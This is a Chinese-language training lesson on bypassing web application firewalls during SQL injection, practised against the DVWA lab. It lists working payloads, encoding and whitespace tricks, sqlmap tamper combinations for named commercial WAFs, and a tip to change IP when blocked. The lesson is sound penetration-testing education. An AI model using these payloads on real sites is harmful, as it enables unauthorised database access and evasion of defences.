---
title: Day034：SQL 注入进阶 - WAF 绕过技巧
tags:
  - 网络安全
  - SQL注入
  - WAF绕过
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d034
date: 2026-02-25
updated: 2026-01-28
---

# Day034：SQL 注入进阶 - WAF 绕过技巧

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 6：SQL 注入进阶 |
| **今日主题** | WAF 检测原理与绕过技巧 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你发现一个注入点，输入 `' or 1=1--`，页面返回"您的请求包含非法字符"。被 WAF 拦截了！
>
> **问题**：网站有 WAF 防护，怎么绕过？
>
> **今天的任务**：学习 WAF 的检测原理，掌握各种绕过技巧。

---

## 今日目标

- [ ] 理解 WAF 的工作原理
- [ ] 掌握至少 5 种绕过技巧
- [ ] 成功绕过 DVWA High 级别防护
- [ ] 了解 SQLMap tamper 脚本

**闯关条件**：使用绕过技巧完成 DVWA High 级别 SQL 注入。

---

## 实战任务（先动手！）

### 任务 1：分析 DVWA High 防护（20 分钟）

**环境**：DVWA - SQL Injection - High

**操作步骤**：

1. 设置 Security Level 为 High
2. 查看源代码，分析防护机制
3. 尝试基础 payload，观察拦截情况

**记录**：
```
防护机制分析：________________
被拦截的 payload：________________
```

---

### 任务 2：大小写绕过（15 分钟）

**原理**：某些 WAF 只检测小写关键字

**Payload**：
```sql
1' oR 1=1--
1' UnIoN SeLeCt 1,2--
1' aNd 1=1--
```

**记录**：
```
测试结果：________________
是否有效：是/否
```

---

### 任务 3：注释绕过（20 分钟）

**原理**：用注释符分割关键字

**Payload**：
```sql
# 内联注释
1' un/**/ion sel/**/ect 1,2--

# MySQL 特有注释
1' /*!union*/ /*!select*/ 1,2--

# 版本号注释（特定版本执行）
1' /*!50000union*/ /*!50000select*/ 1,2--
```

**记录**：
```
测试结果：________________
有效的注释方式：________________
```

---

### 任务 4：编码绕过（25 分钟）

**URL 编码**：
```sql
# 单次编码
1%27%20or%201=1--

# 双重编码
1%2527%2520or%25201=1--
```

**十六进制编码**：
```sql
# 字符串用十六进制
1' union select 0x61646d696e,2--  # admin 的十六进制
```

**Unicode 编码**：
```sql
1%u0027%u0020or%u00201=1--
```

**记录**：
```
有效的编码方式：________________
成功的 payload：________________
```

---

### 任务 5：空格绕过（20 分钟）

**原理**：用其他字符替代空格

**替代方案**：

| 替代符 | 示例 |
|--------|------|
| `/**/` | `1'/**/or/**/1=1--` |
| `%09` (Tab) | `1'%09or%091=1--` |
| `%0a` (换行) | `1'%0aor%0a1=1--` |
| `%0b` | `1'%0bor%0b1=1--` |
| `%0c` | `1'%0cor%0c1=1--` |
| `%a0` | `1'%a0or%a01=1--` |
| `()` | `1'or(1=1)--` |

**记录**：
```
有效的替代符：________________
```

---

### 任务 6：SQLMap Tamper 脚本（30 分钟）

**常用 tamper 脚本**：

```bash
# 查看可用 tamper
sqlmap --list-tampers

# 常用组合
sqlmap -u "http://target/?id=1" --tamper=space2comment,randomcase

# 绕过安全狗
sqlmap -u "http://target/?id=1" --tamper=space2comment,charencode

# 绕过云锁
sqlmap -u "http://target/?id=1" --tamper=between,randomcase,space2comment
```

**常用 tamper 说明**：

| Tamper | 作用 |
|--------|------|
| `space2comment` | 空格替换为 `/**/` |
| `randomcase` | 关键字随机大小写 |
| `charencode` | URL 编码 |
| `between` | 用 `between` 替换 `>` |
| `equaltolike` | `=` 替换为 `like` |
| `base64encode` | Base64 编码 |

**记录**：
```
使用的 tamper 组合：________________
注入结果：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解 WAF 检测原理 | 10 分 |
| 掌握大小写绕过 | 10 分 |
| 掌握注释绕过 | 15 分 |
| 掌握编码绕过 | 15 分 |
| 掌握空格绕过 | 15 分 |
| 会使用 SQLMap tamper | 20 分 |
| 成功绕过 High 级别 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### WAF 工作原理

```
WAF (Web Application Firewall) 检测流程：

请求 → 规则匹配 → 匹配成功 → 拦截
              ↓
         匹配失败 → 放行

检测方式：
1. 关键字匹配：select, union, sleep, etc.
2. 正则匹配：union\s+select
3. 语义分析：理解 SQL 语义（高级 WAF）
```

### 常见 WAF

| WAF | 特点 |
|-----|------|
| 安全狗 | 国内常见，规则较全 |
| 云锁 | 服务器安全软件 |
| 阿里云 WAF | 云 WAF，规则更新快 |
| ModSecurity | 开源，规则可定制 |
| Cloudflare | 国际主流，规则智能 |

### 绕过技巧总结

```
┌─────────────────────────────────────────┐
│              绕过技巧树                  │
├─────────────────────────────────────────┤
│ 1. 大小写混淆                           │
│    UnIoN SeLeCt                         │
├─────────────────────────────────────────┤
│ 2. 注释干扰                             │
│    un/**/ion sel/**/ect                 │
│    /*!50000union*/                      │
├─────────────────────────────────────────┤
│ 3. 编码变形                             │
│    URL编码: %27 %20                     │
│    双重编码: %2527                      │
│    十六进制: 0x61646d696e               │
├─────────────────────────────────────────┤
│ 4. 空格替换                             │
│    /**/ %09 %0a () +                    │
├─────────────────────────────────────────┤
│ 5. 关键字替换                           │
│    and → && 或 %26%26                   │
│    or → || 或 %7c%7c                    │
│    = → like 或 regexp                   │
├─────────────────────────────────────────┤
│ 6. 分块传输                             │
│    HTTP 分块编码绕过                    │
├─────────────────────────────────────────┤
│ 7. 参数污染                             │
│    ?id=1&id=2（取哪个因服务器而异）      │
└─────────────────────────────────────────┘
```

### 高级绕过技巧

**1. 科学计数法**
```sql
1e0union select 1,2
```

**2. 换行符**
```sql
1'%0aunion%0aselect%0a1,2--
```

**3. 括号代替空格**
```sql
1'and(1=1)--
union(select(1),(2))
```

**4. 反引号**
```sql
select`user`from`users`
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 编码被解码 | 服务端二次解码 | 使用双重编码 |
| 组合无效 | 单个有效组合无效 | 注意绕过顺序 |
| IP 被封 | 请求被拒绝 | 降低频率、换 IP |
| 语义分析 WAF | 各种绕过都失败 | 可能需要更高级技巧 |

---

## 知识卡片速查

### 绕过 Payload 速查

```sql
# 大小写
1' UnIoN SeLeCt 1,2--

# 注释
1' un/**/ion sel/**/ect 1,2--
1' /*!union*/ /*!select*/ 1,2--

# 编码
1%27%20union%20select%201,2--
1%2527%2520union%2520select%25201,2--

# 空格替换
1'/**/union/**/select/**/1,2--
1'%0aunion%0aselect%0a1,2--

# 关键字替换
1' && 1=1--
1' || 1=1--
```

### SQLMap Tamper 组合

```bash
# 通用绕过
--tamper=space2comment,randomcase,charencode

# 安全狗
--tamper=space2comment,charencode,randomcase

# 云锁
--tamper=between,randomcase,space2comment

# 阿里云 WAF
--tamper=space2comment,charunicodeencode
```

---

## 常见问题

**Q1：WAF 检测越来越智能，还能绕过吗？**

A1：能，但越来越难。现代 WAF 有：
1. 机器学习检测
2. 语义分析
3. 行为分析

需要更创新的绕过思路。

**Q2：绕过 WAF 合法吗？**

A2：在授权的渗透测试中合法。未授权绕过他人 WAF 是违法的。

**Q3：tamper 脚本不够用怎么办？**

A3：可以自己写！tamper 是 Python 脚本，格式简单：

```python
def tamper(payload, **kwargs):
    return payload.replace("select", "SeLeCt")
```

---

## 明日预告

**Day 035：SQL 注入进阶 - 二次注入与宽字节注入**

明天你将：
- 学习二次注入的原理
- 学习宽字节注入（GBK 编码绕过）
- 完成 Week 6 的综合练习

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功的绕过技巧 | |
| 使用的 tamper | |
| 今日收获 | |

---

> **导师点评**：
>
> WAF 绕过是渗透测试的"艺术"部分。
>
> 安全是博弈——WAF 更新规则，你就想新的绕过方法。这场猫鼠游戏永远不会停。
>
> 但别沉迷于绕过技巧。有时候，找一个没有 WAF 保护的入口，比在正门硬刚 10 个小时更有效。
>
> **记住：绕过是手段，GetShell 才是目的。**

```bash
echo "Day 034 Complete! WAF？不存在的！"
```
